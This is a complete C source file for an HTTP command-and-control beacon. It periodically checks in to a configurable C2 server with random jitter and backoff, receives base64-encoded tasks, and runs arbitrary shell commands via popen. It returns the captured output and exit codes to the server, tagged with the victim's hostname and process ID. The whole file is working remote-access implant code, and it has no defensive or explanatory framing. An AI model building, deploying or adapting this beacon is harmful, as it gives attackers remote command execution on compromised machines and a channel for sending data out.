/*
 * beacon.c — C11/POSIX HTTP beacon for a minimal C2 pair
 *
 * Compile:  cc -std=c11 -Wall -Wextra -o beacon beacon.c
 *
 * Override defaults at compile time:
 *   -DC2_HOST=\"10.0.0.1\"  -DC2_PORT=8080
 *   -DPOLL_BASE=30          (seconds between polls)
 *   -DJITTER_MAX=10         (±seconds of random jitter)
 *   -DBACKOFF_MAX=300       (cap on retry backoff)
 *
 * Protocol (all HTTP POST to /beacon, bodies are JSON):
 *
 *   Beacon → server:
 *     { "id": "<host-id>",
 *       "result": null }                    — plain check-in
 *     { "id": "<host-id>",
 *       "result": { "task_id": "…",
 *                   "output":  "…",
 *                   "exit_code": N } }      — task result
 *
 *   Server → beacon:
 *     { "task": null }                      — nothing queued
 *     { "task": "<base64>" }               — base64(task JSON)
 *
 *   Task JSON (after base64 decode):
 *     { "task_id": "…",
 *       "type":    "exec"|"sleep"|"exit",
 *       "payload": "…" }
 *
 *   stdout and stderr are merged (popen + 2>&1).
 */

#define _POSIX_C_SOURCE 200809L

#include <ctype.h>
#include <errno.h>
#include <limits.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

/* ── tunables ───────────────────────────────────────────────────────────── */

#ifndef C2_HOST
#  define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#  define C2_PORT 8080
#endif
#ifndef POLL_BASE
#  define POLL_BASE 15
#endif
#ifndef JITTER_MAX
#  define JITTER_MAX 5
#endif
#ifndef BACKOFF_MAX
#  define BACKOFF_MAX 300
#endif

/* ── buffer sizes ───────────────────────────────────────────────────────── */

#define HOST_ID_LEN   128
#define CMD_MAX       4096
#define OUTPUT_MAX    65536
#define HTTP_RX_MAX   131072
#define B64_TASK_MAX  8192
#define TASK_ID_LEN   64
#define TYPE_LEN      16
#define PORT_STR_LEN  8

/* ── base64 ─────────────────────────────────────────────────────────────── */

static const char B64_ENC[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static const int8_t B64_DEC[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
};

/* Returns number of bytes written (without NUL), or -1 if dst too small. */
static ssize_t b64_encode(const uint8_t *src, size_t slen,
                          char *dst, size_t dlen)
{
    size_t needed = 4 * ((slen + 2) / 3) + 1;
    if (dlen < needed) return -1;

    size_t i = 0, j = 0;
    for (; i + 2 < slen; i += 3) {
        dst[j++] = B64_ENC[(src[i]   >> 2)];
        dst[j++] = B64_ENC[(src[i]   &  3) << 4 | (src[i+1] >> 4)];
        dst[j++] = B64_ENC[(src[i+1] & 15) << 2 | (src[i+2] >> 6)];
        dst[j++] = B64_ENC[(src[i+2] & 63)];
    }
    if (i < slen) {
        uint8_t a = src[i], b = (i+1 < slen) ? src[i+1] : 0;
        dst[j++] = B64_ENC[a >> 2];
        dst[j++] = B64_ENC[(a & 3) << 4 | (b >> 4)];
        dst[j++] = (i+1 < slen) ? B64_ENC[(b & 15) << 2] : '=';
        dst[j++] = '=';
    }
    dst[j] = '\0';
    return (ssize_t)j;
}

/* Returns decoded byte count, or -1 on bad input / dst too small. */
static ssize_t b64_decode(const char *src, size_t slen,
                          uint8_t *dst, size_t dlen)
{
    /* skip whitespace, validate */
    while (slen && isspace((unsigned char)src[slen-1])) --slen;
    if (slen % 4 != 0) return -1;
    size_t pads = (slen && src[slen-1] == '=') +
                  (slen > 1 && src[slen-2] == '=');
    size_t out  = slen / 4 * 3 - pads;
    if (dlen < out) return -1;

    size_t j = 0;
    for (size_t i = 0; i < slen; i += 4) {
        int8_t a = B64_DEC[(unsigned char)src[i  ]];
        int8_t b = B64_DEC[(unsigned char)src[i+1]];
        int8_t c = B64_DEC[(unsigned char)src[i+2]];
        int8_t d = B64_DEC[(unsigned char)src[i+3]];
        if (a < 0 || b < 0) return -1;
        dst[j++] = (uint8_t)((a << 2) | (b >> 4));
        if (src[i+2] != '=') {
            if (c < 0) return -1;
            dst[j++] = (uint8_t)((b << 4) | (c >> 2));
        }
        if (src[i+3] != '=') {
            if (d < 0) return -1;
            dst[j++] = (uint8_t)((c << 2) | d);
        }
    }
    return (ssize_t)j;
}

/* ── minimal JSON helpers ───────────────────────────────────────────────── */

/*
 * Extract the string value for `key` from a flat JSON object.
 * Writes the value (unescaped, no nested-object support needed here)
 * into buf[buflen].  Returns 0 on success, -1 if key not found or
 * value is JSON null.
 */
static int json_get_string(const char *json, const char *key,
                            char *buf, size_t buflen)
{
    /* build search pattern  "key": */
    char pat[128];
    snprintf(pat, sizeof pat, "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return -1;
    p += strlen(pat);
    while (*p == ' ' || *p == '\t') ++p;
    if (*p != ':') return -1;
    ++p;
    while (*p == ' ' || *p == '\t') ++p;
    if (strncmp(p, "null", 4) == 0) return -1;
    if (*p != '"') return -1;
    ++p; /* skip opening quote */
    size_t i = 0;
    while (*p && *p != '"' && i + 1 < buflen) {
        if (*p == '\\' && *(p+1)) { ++p; }  /* very basic unescape */
        buf[i++] = *p++;
    }
    buf[i] = '\0';
    return (*p == '"') ? 0 : -1;
}

static int json_get_int(const char *json, const char *key, long *out)
{
    char pat[128];
    snprintf(pat, sizeof pat, "\"%s\"", key);
    const char *p = strstr(json, pat);
    if (!p) return -1;
    p += strlen(pat);
    while (*p == ' ' || *p == '\t') ++p;
    if (*p != ':') return -1;
    ++p;
    while (*p == ' ' || *p == '\t') ++p;
    char *end;
    errno = 0;
    *out = strtol(p, &end, 10);
    return (errno == 0 && end != p) ? 0 : -1;
}

/* Escape a string for embedding in JSON (writes to dst, returns dst). */
static char *json_escape(const char *src, char *dst, size_t dlen)
{
    size_t j = 0;
    for (size_t i = 0; src[i] && j + 4 < dlen; ++i) {
        unsigned char c = (unsigned char)src[i];
        if      (c == '"')  { dst[j++] = '\\'; dst[j++] = '"';  }
        else if (c == '\\') { dst[j++] = '\\'; dst[j++] = '\\'; }
        else if (c == '\n') { dst[j++] = '\\'; dst[j++] = 'n';  }
        else if (c == '\r') { dst[j++] = '\\'; dst[j++] = 'r';  }
        else if (c == '\t') { dst[j++] = '\\'; dst[j++] = 't';  }
        else if (c < 0x20)  { j += (size_t)snprintf(dst+j, dlen-j,
                                                     "\\u%04x", c); }
        else                { dst[j++] = (char)c; }
    }
    dst[j] = '\0';
    return dst;
}

/* ── host id ────────────────────────────────────────────────────────────── */

static void get_host_id(char *buf, size_t len)
{
#ifndef HOST_NAME_MAX
#  define HOST_NAME_MAX 255
#endif
    char hn[HOST_NAME_MAX + 1] = {0};
    if (gethostname(hn, sizeof hn) != 0)
        strncpy(hn, "unknown", sizeof hn - 1);
    snprintf(buf, len, "%s-%d", hn, (int)getpid());
}

/* ── raw HTTP POST ──────────────────────────────────────────────────────── */

/*
 * Sends a JSON body to host:port/path.
 * Writes the HTTP response body into resp[rlen].
 * Returns HTTP status code (e.g. 200), or -1 on network/parse error.
 */
static int http_post(const char *host, int port, const char *path,
                     const char *body,
                     char *resp, size_t rlen)
{
    char port_str[PORT_STR_LEN];
    snprintf(port_str, sizeof port_str, "%d", port);

    struct addrinfo hints = {0}, *ai = NULL;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, port_str, &hints, &ai) != 0) return -1;

    int fd = -1;
    for (struct addrinfo *r = ai; r; r = r->ai_next) {
        fd = socket(r->ai_family, r->ai_socktype, r->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, r->ai_addr, r->ai_addrlen) == 0) break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(ai);
    if (fd < 0) return -1;

    size_t body_len = strlen(body);
    char req[CMD_MAX + 512];
    int req_len = snprintf(req, sizeof req,
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        path, host, port, body_len, body);
    if (req_len < 0 || (size_t)req_len >= sizeof req) {
        close(fd);
        return -1;
    }

    /* send request */
    const char *ptr = req;
    ssize_t remaining = req_len;
    while (remaining > 0) {
        ssize_t n = write(fd, ptr, (size_t)remaining);
        if (n <= 0) { close(fd); return -1; }
        ptr       += n;
        remaining -= n;
    }

    /* read response */
    char raw[HTTP_RX_MAX];
    size_t total = 0;
    while (total < sizeof raw - 1) {
        ssize_t n = read(fd, raw + total, sizeof raw - 1 - total);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) break;
        total += (size_t)n;
    }
    close(fd);
    raw[total] = '\0';

    /* parse status line */
    if (strncmp(raw, "HTTP/", 5) != 0) return -1;
    char *sp = strchr(raw, ' ');
    if (!sp) return -1;
    int status = (int)strtol(sp + 1, NULL, 10);

    /* find body after \r\n\r\n */
    char *body_start = strstr(raw, "\r\n\r\n");
    if (!body_start) {
        resp[0] = '\0';
        return status;
    }
    body_start += 4;
    size_t blen = (size_t)(raw + total - body_start);
    if (blen >= rlen) blen = rlen - 1;
    memcpy(resp, body_start, blen);
    resp[blen] = '\0';
    return status;
}

/* ── command execution ──────────────────────────────────────────────────── */

/*
 * Runs cmd via popen (stderr merged with stdout via 2>&1).
 * Output written to out_buf[out_len].  exit_code set to the
 * process exit status, or -1 if popen/pclose failed.
 */
static void run_command(const char *cmd_str,
                        char *out_buf, size_t out_len,
                        int  *exit_code)
{
    char shell_cmd[CMD_MAX + 8];
    snprintf(shell_cmd, sizeof shell_cmd, "%s 2>&1", cmd_str);

    FILE *fp = popen(shell_cmd, "r");
    if (!fp) {
        snprintf(out_buf, out_len, "popen failed: %s", strerror(errno));
        *exit_code = -1;
        return;
    }
    size_t total = 0;
    while (total < out_len - 1) {
        size_t n = fread(out_buf + total, 1, out_len - 1 - total, fp);
        if (n == 0) break;
        total += n;
    }
    out_buf[total] = '\0';
    int status  = pclose(fp);
    *exit_code  = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

/* ── task parsing ───────────────────────────────────────────────────────── */

typedef struct {
    char task_id[TASK_ID_LEN];
    char type   [TYPE_LEN];
    char payload[CMD_MAX];
} Task;

/* Returns 0 on success, -1 on decode/parse error. */
static int parse_task(const char *b64, Task *t)
{
    uint8_t decoded[B64_TASK_MAX];
    ssize_t dlen = b64_decode(b64, strlen(b64), decoded, sizeof decoded - 1);
    if (dlen < 0) return -1;
    decoded[dlen] = '\0';

    const char *js = (const char *)decoded;
    if (json_get_string(js, "task_id", t->task_id, sizeof t->task_id) < 0)
        return -1;
    if (json_get_string(js, "type",    t->type,    sizeof t->type)    < 0)
        return -1;
    /* payload is optional (exit has none) */
    if (json_get_string(js, "payload", t->payload, sizeof t->payload) < 0)
        t->payload[0] = '\0';
    return 0;
}

/* ── checkin helpers ────────────────────────────────────────────────────── */

static int do_checkin(const char *host_id,
                      const char *task_id,  /* NULL = no result */
                      const char *output,
                      int         exit_code,
                      char       *resp_buf,
                      size_t      resp_len)
{
    char esc_id  [HOST_ID_LEN * 2];
    char req_body[OUTPUT_MAX + 512];

    json_escape(host_id, esc_id, sizeof esc_id);

    if (task_id) {
        char esc_tid[TASK_ID_LEN * 2];
        char esc_out[OUTPUT_MAX * 2];
        json_escape(task_id, esc_tid, sizeof esc_tid);
        json_escape(output  ? output : "", esc_out, sizeof esc_out);
        snprintf(req_body, sizeof req_body,
            "{\"id\":\"%s\",\"result\":{\"task_id\":\"%s\","
            "\"output\":\"%s\",\"exit_code\":%d}}",
            esc_id, esc_tid, esc_out, exit_code);
    } else {
        snprintf(req_body, sizeof req_body,
            "{\"id\":\"%s\",\"result\":null}", esc_id);
    }

    return http_post(C2_HOST, C2_PORT, "/beacon",
                     req_body, resp_buf, resp_len);
}

/* ── main loop ──────────────────────────────────────────────────────────── */

int main(void)
{
    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    char host_id[HOST_ID_LEN];
    get_host_id(host_id, sizeof host_id);

    char resp_buf[HTTP_RX_MAX];
    char b64_task[B64_TASK_MAX];
    char output  [OUTPUT_MAX];

    int backoff = 0;

    while (1) {
        /* ---- jitter sleep ---- */
        int jitter = JITTER_MAX > 0 ? (int)(rand() % (JITTER_MAX * 2 + 1))
                                      - JITTER_MAX : 0;
        int interval = POLL_BASE + jitter;
        if (interval < 1) interval = 1;
        if (backoff > 0) {
            fprintf(stderr, "[beacon] backing off %ds\n", backoff);
            sleep((unsigned)backoff);
        } else {
            sleep((unsigned)interval);
        }

        /* ---- check in (no result) ---- */
        resp_buf[0] = '\0';
        int status = do_checkin(host_id, NULL, NULL, 0,
                                resp_buf, sizeof resp_buf);
        if (status != 200) {
            backoff = backoff ? (backoff * 2 > BACKOFF_MAX
                                 ? BACKOFF_MAX : backoff * 2)
                              : POLL_BASE;
            continue;
        }
        backoff = 0;

        /* ---- parse task ---- */
        if (json_get_string(resp_buf, "task",
                            b64_task, sizeof b64_task) < 0)
            continue;  /* null or missing — nothing queued */

        Task t;
        if (parse_task(b64_task, &t) < 0) {
            fprintf(stderr, "[beacon] failed to parse task\n");
            continue;
        }

        /* ---- dispatch ---- */
        int exit_code = 0;
        output[0] = '\0';

        if (strcmp(t.type, "exit") == 0) {
            /* ack then exit */
            do_checkin(host_id, t.task_id, "exiting", 0,
                       resp_buf, sizeof resp_buf);
            return 0;

        } else if (strcmp(t.type, "sleep") == 0) {
            long secs = t.payload[0] ? strtol(t.payload, NULL, 10) : 5;
            if (secs < 0) secs = 0;
            sleep((unsigned)secs);
            snprintf(output, sizeof output, "slept %lds", secs);

        } else if (strcmp(t.type, "exec") == 0) {
            if (t.payload[0] == '\0') {
                strncpy(output, "empty command", sizeof output - 1);
                exit_code = 1;
            } else {
                run_command(t.payload, output, sizeof output, &exit_code);
            }

        } else {
            snprintf(output, sizeof output,
                     "unknown task type: %s", t.type);
            exit_code = 1;
        }

        /* ---- return result ---- */
        status = do_checkin(host_id, t.task_id, output, exit_code,
                            resp_buf, sizeof resp_buf);
        if (status != 200) {
            fprintf(stderr, "[beacon] result post failed (status %d)\n",
                    status);
            backoff = POLL_BASE;
        }
    }
}
